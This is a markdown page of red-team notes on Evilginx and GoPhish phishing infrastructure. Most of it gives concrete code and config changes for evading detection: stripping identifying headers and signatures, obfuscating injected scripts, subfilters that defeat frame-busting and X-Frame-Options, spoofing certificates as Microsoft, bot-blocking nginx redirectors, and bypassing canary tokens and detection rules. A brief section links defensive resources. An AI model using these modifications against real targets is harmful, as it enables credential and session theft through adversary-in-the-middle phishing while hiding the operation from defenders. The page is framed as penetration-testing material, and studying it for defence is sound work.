## Phishing Engagements With Evilginx

- **Building Evilginx Phishlets**
    - Evilginx Mastery Course : [https://academy.breakdev.org/evilginx-mastery](https://academy.breakdev.org/evilginx-mastery)
    - Evilginx Docs : [https://help.evilginx.com/](https://help.evilginx.com/)
    - Evilginx Phishlets Collections : [https://github.com/An0nUD4Y/Evilginx2-Phishlets](https://github.com/An0nUD4Y/Evilginx2-Phishlets)
    - Evilginx Less Known Techniques : [https://github.com/An0nUD4Y/Evilginx2-Phishlets?tab=readme-ov-file#some-less-known-techniques](https://github.com/An0nUD4Y/Evilginx2-Phishlets?tab=readme-ov-file#some-less-known-techniques)

- **Evilginx Installation Scripts**
    - [https://gist.github.com/dunderhay/d5fcded54cc88a1b7e12599839b6badb](https://gist.github.com/dunderhay/d5fcded54cc88a1b7e12599839b6badb)

- **Securing Evilginx Infra tips -**
    - [https://github.com/An0nUD4Y/Evilginx2-Phishlets#securing-evilginx-infra-tips](https://github.com/An0nUD4Y/Evilginx2-Phishlets#securing-evilginx-infra-tips)
        
        ```markdown
        - Rewrite URLs on Phishing Pages to avoid detection through URL Path pattern matching (by Kuba).
        - Remove IOCs (X-Evilginx header and Default Cert Details)
        - Modify Unauth redirect static contents
        - Modify code to request wildcard certificates for root domain from Let'sEncrypt other than requesting for each subdomains (As mentioned in Kuba's blog) - Check this repo for reference https://github.com/ss23/evilginx2
        - Put evilginx behind a proxy to help against TLS fingerprinting (JA3 and JA3S)
        - Use cloudflare in between if possible/feasible (You have to configure the SSL Settings correctly, change it to Full in cloudflare settings)
        - Use some known ASN blacklist to avoid getting detected like here (https://github.com/aalex954/evilginx2-TTPs#ip-blacklist)
        - Reduce the Number of proxyhosts in phishlet if possible to reduce content loading time.
        - Host Evilginx at Azure and use their domain (limit proxy host in phishlet to 1 or find a way , may be create multiple azure sub domains and try with that)
        - Add some sub_filters to modify the content of the pages to avoid content based detections, like (Favicon, form title font or style, or anything which seems relevant)
        - Block the feedback/telemetry/logs/analytics subdomains using the phishlet sub_filters which can log the domain or may help later on analysis.
        - See if js-injected is static or dynamic , if static modify the evilginx js-inject code to create dynamic/obfuscated version of your js for each user/target.
        - Make sure to not leak your Evilginx infra IP, Check the DNS history to make sure its not stored anywhere (Analysts may look for older DNS Records of the domain)
        - Be aware of this research : https://catching-transparent-phish.github.io/catching_transparent_phish.pdf , repo - https://catching-transparent-phish.github.io/
        ```
        
    - Remove X-Evilginx header (Check all the code lines with req.Header.Set and comment relevant functions in core/http_proxy.go file)
      ```markdown
        // comment line 469
        req.Header.Set(p.getHomeDir(), o_host)
        
        //comment line 659
        req.Header.Set(p.getHomeDir(), o_host)
        
        // comment function at line 1791-1793
        func (p *HttpProxy) getHomeDir() string {
        	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
        }
        
        // comment line 52-54
        const (
        	HOME_DIR = ".evilginx"
        )
        ```            
    - To Modify Unauth redirect static contents, Search for `<html>` in core/http_proxy.go file and modify the html code to remove any static signatures.
    - Also to avoid the static injected js code signature detection , You can modify the code as below
        - Make sure to add "[github.com/tdewolff/minify/js](http://github.com/tdewolff/minify/js)" in imports
            
            ```jsx
            	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
            	var d_inject string
            
            	if script != "" {
            		minifier := minify.New() // "github.com/tdewolff/minify/js"
            		minifier.AddFunc("text/javascript", js.Minify)
            		obfuscatedScript, err := minifier.String("text/javascript", script)
            		if err != nil {
            			// Handle error - Obfuscation failed
            			d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + script + "</script>\n${1}"
            		}
            		d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + obfuscatedScript + "</script>\n${1}"
            		//d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + script + "</script>\n${1}"
            
            	} else if src_url != "" {
            		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
            	} else {
            		return body
            	} 
            ```
            
    - Modify core/cert.db file as well
    - Change `“rid”` for gophish.
    - Use nginx , caddy or other proxies infront of evilginx.
    - Use Redirectors
        - Use cloudflare turnstile as evilginx redirector and block bots.
            - https://github.com/kgretzky/evilginx2/blob/master/redirectors/turnstile/index.html
        - Obfuscate html/js based redirectors
            - Suspicious HTTP User agents list : https://github.com/mthcht/awesome-lists/blob/main/Lists/suspicious_http_user_agents_list.csv
            - https://github.com/DosX-dev/WebSafeCompiler
        - Bot detection methods used by gabagool phishing kit : https://medium.com/@traclabs_/aitm-phishing-hold-the-gabagool-analyzing-the-gabagool-phishing-kit-531f5bbaf0e4
        - Meta html tag for redirection
            - `<meta http-equiv="refresh" content="5;url=https://example.com">`
    - Change default lure url pattern which is random string of length 8.
      ```markdown
         // Line 728 in core/terminal.go file
				l := &Lure{
					Path:     "/" + GenRandomString(8),
					Phishlet: args[1],
				}
        ```     
    - Rewrite URLs on Phishing Pages to avoid detection through URL Path pattern matching (by Kuba). [This Feature not available in evilginx Public Version, You have to implement it yourself.]
        
        ```markdown
        # Only Work in Evilginx Pro Version
        # Similar functionality can be implemented in public version as well.
        rewrite_urls:
        
        trigger:
        domains: ['www.linkedin.com']
        paths: ['^/login$']
        rewrite:
        path: '/this/is/not/the/path/you/are/looking/for.php'
        query:
        
            {key:'a', value: 'HOW'}
            {key:'b', value: 'MUCH'}
            {key:'d', value: 'IS'}
            {key:'e', value: 'THE'}
            {key:'f', value: 'PHISH'}
            {key:'q', value: '{id}'}
        
        ```
        
        ![Untitled](img/Untitled%201.png)

    - Modify the lure/session identifier cookies signatured pattern and value (by @[rad9800](https://x.com/rad9800/status/1858242066356019317?s=46&t=mlJvZy0Zrkrxzuvtt7m2cQ) )
        - Rule 1: Cookie name=XXXX-XXXX & value=64_hex_chars - https://gist.github.com/rad9800/bb73de360fc07ac544f0bc9faac9082d#file-index-js-L130
            - Responsible evilginx Code Functionality (For cookie-Name) : https://github.com/kgretzky/evilginx2/blob/9e32484719681892945130187ea52737b3d72051/core/http_proxy.go#L1984
            - Responsible evilginx Code Functionality (For cookie-Value) : https://github.com/kgretzky/evilginx2/blob/9e32484719681892945130187ea52737b3d72051/core/http_proxy.go#L895
        - Rule 2: Script path=/s/64_hex_chars.js with content-length=0
        - Rule 3: Both Rule 1 & Rule 2 present
            - the full snippet js blob logic is here https://gist.github.com/rad9800/bb73de360fc07ac544f0bc9faac9082d
    - Block Referrer headers from leaking your phishing domain name - check [this](https://insights.spotit.be/2024/06/03/clipping-the-canarys-wings-bypassing-aitm-phishing-detections/) research blog for reference :
        - Add below line in http_proxy.go file [here](https://github.com/kgretzky/evilginx2/blob/55579600ca826a94b328d5e0cb35740045a35b2e/core/http_proxy.go#L887) (Chrome don’t respect this and when request is initiated by url() CSS function - check blog for more)
            - `resp.Header.Set("Referrer-Policy", "no-referrer")`
            - To automate from phishlet Check this PR : https://github.com/kgretzky/evilginx2/pull/1006
    - Define your own CSP (Content security Policy) to avoid telemetry/canary/detection by leaking phishing domain.
        - Read this for more : https://insights.spotit.be/2024/06/03/clipping-the-canarys-wings-bypassing-aitm-phishing-detections/
    - Check if target site is using some sort of canary tokens (CSS, JS) and avoid them
        - Bypassing (CSS,JS) Canary AiTM Detection : https://insights.spotit.be/2024/06/03/clipping-the-canarys-wings-bypassing-aitm-phishing-detections/
        - https://blog.thinkst.com/2024/01/defending-against-the-attack-of-the-cloned-websites.html
    - JA4 fingerprint evasion
        - https://github.com/refraction-networking/utls
        - https://github.com/juzeon/spoofed-round-tripper
    - BITB + evilginx + Frame Busting Bypass
        - https://x.com/otterhacker/status/1929487165458641045?s=46&t=mlJvZy0Zrkrxzuvtt7m2cQ
            - OktaGinx : https://github.com/OtterHacker/OktaGinx/blob/main/okta.yaml#L17
        - https://github.com/waelmas/frameless-bitb
        - Frame Busting Bypass Example Subfilter from : https://github.com/OtterHacker/OktaGinx/blob/44fed02954b6cd65e17ab581209a4d0f3b734c24/okta.yaml#L124 and https://github.com/OtterHacker/OktaGinx/blob/44fed02954b6cd65e17ab581209a4d0f3b734c24/okta.yaml#L82
            ```markdown
            - triggers_on: 'login.microsoftonline.com'
            orig_sub: ''
            domain: 'okta.com'
            search: 'if\(e.self===e.top\){'
            replace: 'if(true){window.oldself=e.self;e.self=e.top;'
            mimes: ['text/html', 'charset=utf-8']
            
          - triggers_on: 'login.microsoftonline.com'
            orig_sub: ''
            domain: 'okta.com'
            search: 'X-Frame-Options: DENY'
            replace: 'Test: test'
            mimes: ['text/html', 'charset=utf-8']
          ```
            - Frame Busting Techniques Generally used
              - https://en.wikipedia.org/wiki/Framekiller
              - https://seclab.stanford.edu/websec/framebusting/framebust.pdf
                - Common Techniques to Detect Presence of iframe
                  ```
                    if (top != self)
                    if (top.location != self.location)
                    if (top.location != location)
                    if (parent.frames.length > 0)
                    if (window != top)
                    if (window.top !== window.self)
                    if (window.self != window.top)
                    if (parent && parent != window)
                    if (parent && parent.frames && parent.frames.length>0)
                    if((self.parent&&!(self.parent===self))&&(self.parent.frames.length!=0))
                  ```
                - Websites may use following method once iframe detected to perform redirection
                   ```
                   top.location.replace(self.location)
                    top.location.href = window.location.href
                    top.location.replace(document.location)
                    top.location.href = window.location.href
                    top.location.href = "URL"
                    document.write(’’)
                    top.location = location
                    top.location.replace(document.location)
                    top.location.replace(’URL’)
                    top.location.href = document.location
                    top.location.replace(window.location.href)
                    top.location.href = location.href
                    self.parent.location = document.location
                    parent.location.href = self.document.location
                    top.location.href = self.location
                    top.location = window.location
                    top.location.replace(window.location.pathname)
                    window.top.location = window.self.location
                    setTimeout(function(){document.body.innerHTML=’’;},1);
                    window.self.onload = function(evt){document.body.innerHTML=’’;}
                    var url = window.location.href; top.location.replace(url)
                   ```
                
### Evilginx Research Blogs/Talks :
- A smooth sea never made a skilled phisherman - Kuba Gretzky (x33fc0n 2024) :
    - Talk : [https://youtu.be/Nh99d3YnpI4?si=Ltwus2PS0z97gf2R](https://youtu.be/Nh99d3YnpI4?si=Ltwus2PS0z97gf2R)
    - Slides : [https://github.com/kgretzky/talks/blob/main/2024/x33fcon/a-smooth-sea-never-made-a-skilled-phisherman.pdf](https://github.com/kgretzky/talks/blob/main/2024/x33fcon/a-smooth-sea-never-made-a-skilled-phisherman.pdf)
- The triforce of initial Access : [https://trustedsec.com/blog/the-triforce-of-initial-access](https://trustedsec.com/blog/the-triforce-of-initial-access)
    - Bobber : [https://github.com/Flangvik/Bobber](https://github.com/Flangvik/Bobber)
- Bypassing Canary AiTM Detection : [https://insights.spotit.be/2024/06/03/clipping-the-canarys-wings-bypassing-aitm-phishing-detections/](https://insights.spotit.be/2024/06/03/clipping-the-canarys-wings-bypassing-aitm-phishing-detections/)
- Protect Evilginx using cloudflare and HTML obf : [https://www.jackphilipbutton.com/post/how-to-protect-evilginx-using-cloudflare-and-html-obfuscation](https://www.jackphilipbutton.com/post/how-to-protect-evilginx-using-cloudflare-and-html-obfuscation)
- (Improve Evilginx email delivery trust) Adding SPF, DMARC, DKIM, MX records : [https://fortbridge.co.uk/research/add-spf-dmarc-dkim-mx-records-evilginx/](https://fortbridge.co.uk/research/add-spf-dmarc-dkim-mx-records-evilginx/)
    - [https://m3rcer.netlify.app/redteaming/spamfilterbypass/](https://m3rcer.netlify.app/redteaming/spamfilterbypass/)
- Phishing Tactics and OPSEC : [https://mgeeky.tech/uploads/WarCon22 - Modern Initial Access and Evasion Tactics.pdf](https://mgeeky.tech/uploads/WarCon22%20-%20Modern%20Initial%20Access%20and%20Evasion%20Tactics.pdf)
- Evilginx + BITB + Evasion Tactics : [https://youtu.be/p1opa2wnRvg](https://youtu.be/p1opa2wnRvg)
- Hook, Line and Phishlet - Conquering AD FS With Evilginx : [https://research.aurainfosec.io/pentest/hook-line-and-phishlet/](https://research.aurainfosec.io/pentest/hook-line-and-phishlet/)
- O365 Phishing Infrastructure - [https://badoption.eu/blog/2023/12/03/PhishingInfra.html](https://badoption.eu/blog/2023/12/03/PhishingInfra.html)
- You Can’t See Me – Protecting Your Phishing Infrastructure : [https://redsiege.com/blog/2024/01/you-cant-see-me-protecting-your-phishing-infrastructure/](https://redsiege.com/blog/2024/01/you-cant-see-me-protecting-your-phishing-infrastructure/)
- [https://janbakker.tech/evilginx-resources-for-microsoft-365/](https://janbakker.tech/evilginx-resources-for-microsoft-365/)
- Evilginx + BITB - [https://www.youtube.com/watch?v=luJjxpEwVHI&feature=youtu.be](https://www.youtube.com/watch?v=luJjxpEwVHI&feature=youtu.be)
- Hook, Line and Sinker: Phishing Windows Hello for Business using Evilginx : [https://medium.com/@yudasm/bypassing-windows-hello-for-business-for-phishing-181f2271dc02](https://medium.com/@yudasm/bypassing-windows-hello-for-business-for-phishing-181f2271dc02)
- Phishing the resistant - Phishing for primary Refresh token in Microsoft Entra by Dirk Jan  : [https://youtu.be/tNh_sYkmurI?si=qcb917IB5zHU1fQk](https://youtu.be/tNh_sYkmurI?si=qcb917IB5zHU1fQk)
- X33fcon 2024 - [https://youtu.be/Nh99d3YnpI4?si=Ltwus2PS0z97gf2R](https://youtu.be/Nh99d3YnpI4?si=Ltwus2PS0z97gf2R)
- Like Shooting Phish in a Barrel - Bypassing Link Crawlers : ****https://posts.specterops.io/like-shooting-phish-in-a-barrel-926c1905bb4b
- Drink Like a Phish - How to Make Your Phishing Sites Blend In ****: [https://posts.specterops.io/drink-like-a-phish-b9e91d0b5677](https://posts.specterops.io/drink-like-a-phish-b9e91d0b5677?source=collection_home---6------0-----------------------)
- Feeding the Phishes : ****https://posts.specterops.io/feeding-the-phishes-276c3579bba7
- https://posts.specterops.io/phish-out-of-water-aaeb677a5af3
- https://youtu.be/6jYZQKDlKco?si=cpfd4tWQ4V8ZAZaI
- https://posts.specterops.io/one-phish-two-phish-red-teams-spew-phish-1a2f02010ed7
- Push Security Phishing Tools Detection : https://gist.github.com/rad9800/bb73de360fc07ac544f0bc9faac9082d
    - Push Security's chrome extension detect evilginx with some pretty brittle rules
        - Rule 1: Cookie name=XXXX-XXXX & value=64_hex_chars
        - Rule 2: Script path=/s/64_hex_chars.js with content-length=0
        - Rule 3: Both Rule 1 & Rule 2 present
        - the full snippet js blob logic is here https://gist.github.com/rad9800/bb73de360fc07ac544f0bc9faac9082d
- https://janbakker.tech/evilginx-loves-temporary-access-passes-too/
          
### Defense Tactics Against Evilginx
- Unravelling and Countering Adversary in the middle Phishing - X33fcon 2024 - [https://youtu.be/-W-LxcbUxI4](https://youtu.be/-W-LxcbUxI4?feature=shared)
- Using HoneyTokens to detect AiTM : [https://zolder.io/using-honeytokens-to-detect-aitm-phishing-attacks-on-your-microsoft-365-tenant/](https://zolder.io/using-honeytokens-to-detect-aitm-phishing-attacks-on-your-microsoft-365-tenant/)
- Protect Against Modern Phishing : [https://bleekseeks.com/blog/how-to-protect-against-modern-phishing-attacks](https://bleekseeks.com/blog/how-to-protect-against-modern-phishing-attacks)
- [https://www.youtube.com/watch?v=wTLB0Yh70_0](https://www.youtube.com/watch?v=wTLB0Yh70_0)
- Detecting evilginx using JA3, JA3S, JA4 fingerprinting
    - JA4 Database : [https://ja4db.com/](https://ja4db.com/)
    

    



## Securing GoPhish Infra

> These modifications will also work in the latest evilginx + gophish version i.e evilginx3.3
> 
- Tips : Use {{.URL}} parameter in phishing template while using with evilginx ( [https://github.com/kgretzky/evilginx2/issues/1042#issuecomment-2052073864](https://github.com/kgretzky/evilginx2/issues/1042#issuecomment-2052073864))
- Modifications in gophish source code and file structure to Secure the GoPhish Infra
    - Remove `X-Gophish` instances ( `X-Gophish-Contact` , `X-Gophish-Signature`)
    - Remove `const ServerName= "gophish"` and change it to `const ServerName= "IGNORE"` in file `config/config.go`
    - Change the default Admin server port in `config.json` file.
    - Modify Test Email Message Signatures, To avoid detection during SMTP Testing. `Controllers > api > util.go`
        
        ```yaml
        Controllers > api > util.go
        models > testdata > email_request.go
        models > testdata > email_request_test.go
        models > testdata > maillog.go
        models > testdata > maillog_test.go
        models > testdata > smtp_test.go
        ```
        
    - Change 404 response
        - Add below custom function in `controllers/phish.go` file
            
            ```go
            func customNotFound(w http.ResponseWriter, r *http.Request) {
            	http.Error(w, "Try again!", http.StatusNotFound)
            }
            ```
            
        - Now replace all instances of `http.NotFound(w, r)` to `customNotFound(w, r)`
    - Remove robots.txt hardcoded response and modify it in file `controllers/phish.go`
        - Modify the respective code in phish.go file to below one.
            
            ```go
            //Modified Response
            // RobotsHandler prevents search engines, etc. from indexing phishing materials
            func (ps *PhishingServer) RobotsHandler(w http.ResponseWriter, r *http.Request) {
            	fmt.Fprintln(w, "User-agent: *\nDisallow: /*/*\nDisallow: /.git/*")
            }
            ```
            
    - Modify the `“rid”` GET Parameter in requests
        - Make sure to modify all the instances of `"rid"` to something else.
        - These are also present in evilginx3.3 source code , So make sure to modify there as well.
    - For advance preventions, You can modify the static folder as well and rename it to something else, also rename the files inside it to avoid path based detection. Just do not forget to modify the relevance source code as well.
        - Like images name , example : pixel.png , modify it to something else.
    - Change the Certificate Properties in `util/util.go` file
        
        ```go
        	template := x509.Certificate{
        		SerialNumber: serialNumber,
        		Subject: pkix.Name{
        			//Organization: []string{"Gophish"},
        			Organization: []string{"Microsoft Corporation"},
        		},
        ```
        
    - Use Nginx to proxy traffic through it to avoid any Golang Server Fingerprint
        - `service nginx start`
        - You need to change the gophish `config.json` to change the ports for http from 80 to 8080 and https from default to 60002, as shown below
            
            ```yaml
            {
            	"admin_server": {
            		"listen_url": "127.0.0.1:60002",
            		"use_tls": true,
            		"cert_path": "gophish_admin.crt",
            		"key_path": "gophish_admin.key",
            		"trusted_origins": []
            	},
            	"phish_server": {
            		"listen_url": "127.0.0.1:8080",
            		"use_tls": false,
            		"cert_path": "example.crt",
            		"key_path": "example.key"
            	},
            	"db_name": "sqlite3",
            	"db_path": "gophish.db",
            	"migrations_prefix": "db/db_",
            	"contact_address": "",
            	"logging": {
            		"filename": "",
            		"level": ""
            	}
            }
            ```
            
        - Below configuration will block all requests with user agent containing “Bot” or “bot”
            
            ```yaml
            # /etc/nginx/nginx.conf
            
            events {
                # Define event processing parameters here
                worker_connections 1024; # Adjust according to your requirements
            }
            
            http {
            
                upstream backend {
                    server localhost:8080;
                }
                # HTTP server
                server {
                    listen 80 default_server;
                    
            
                    # Reject requests with "bot" or "Bot" in User-Agent
                    if ($http_user_agent ~* (bot|Bot)) {
                        return 403;
                    }
            
                    location / {
                        proxy_pass http://backend;
                        proxy_set_header Host $host;
                        proxy_set_header X-Real-IP $remote_addr;
                        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                        proxy_set_header X-Forwarded-Proto $scheme;
                    }
                }
            
                upstream backend_https {
                    server localhost:60002;
                }
                # HTTPS server
                server {
                    listen 60001 ssl default_server;
            
                    ssl_certificate /root/Phishing/gophish-mod/gophish_admin.crt;
                    ssl_certificate_key /root/Phishing/gophish-mod/gophish_admin.key;
            
                    # Reject requests with "bot" or "Bot" in User-Agent
                    if ($http_user_agent ~* (bot|Bot)) {
                        return 403;
                    }
            
                    location / {
                        proxy_pass https://backend_https;
                        proxy_set_header Host $host;
                        proxy_set_header X-Real-IP $remote_addr;
                        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                        proxy_set_header X-Forwarded-Proto $scheme;
                    }
                }
            }
            
            ```
            
        - To allow specific user agent only, use below config. This will block all requests and only allow requests which has user agent “`iamdevil`”.
            
            ```yaml
            # /etc/nginx/nginx.conf
            
            events {
                # Define event processing parameters here
                worker_connections 1024; # Adjust according to your requirements
            }
            
            http {
            
                upstream backend {
                    server localhost:8080;
                }
            
                # HTTP server
                server {
                    listen 80 default_server;
            
                    # Reject requests with user agent other than "iamdevil"
                    if ($http_user_agent != "iamdevil") {
                        return 403;
                    }
            
                    location / {
                        proxy_pass http://backend;
                        proxy_set_header Host $host;
                        proxy_set_header X-Real-IP $remote_addr;
                        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                        proxy_set_header X-Forwarded-Proto $scheme;
                    }
                }
            
                upstream backend_https {
                    server localhost:60002;
                }
            
                # HTTPS server
                server {
                    listen 60001 ssl default_server;
            
                    ssl_certificate /root/Phishing/gophish-mod/gophish_admin.crt;
                    ssl_certificate_key /root/Phishing/gophish-mod/gophish_admin.key;
            
                    # Reject requests with user agent other than "iamdevil"
                    if ($http_user_agent != "iamdevil") {
                        return 403;
                    }
            
                    location / {
                        proxy_pass https://backend_https;
                        proxy_set_header Host $host;
                        proxy_set_header X-Real-IP $remote_addr;
                        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                        proxy_set_header X-Forwarded-Proto $scheme;
                    }
                }
            }
            ```
            
    - Modify Gophish Tracking Pixel signature to avoid detection based on signatured tracking pixel.
    - Change the gophish email headers sequence pattern. It may be used to detect the gophish (From BreakDev Red Community).
    - Setup PostFix infront of gophish to remove IOCs and other detection and spamyness of emails and also removed and fixes the headers.

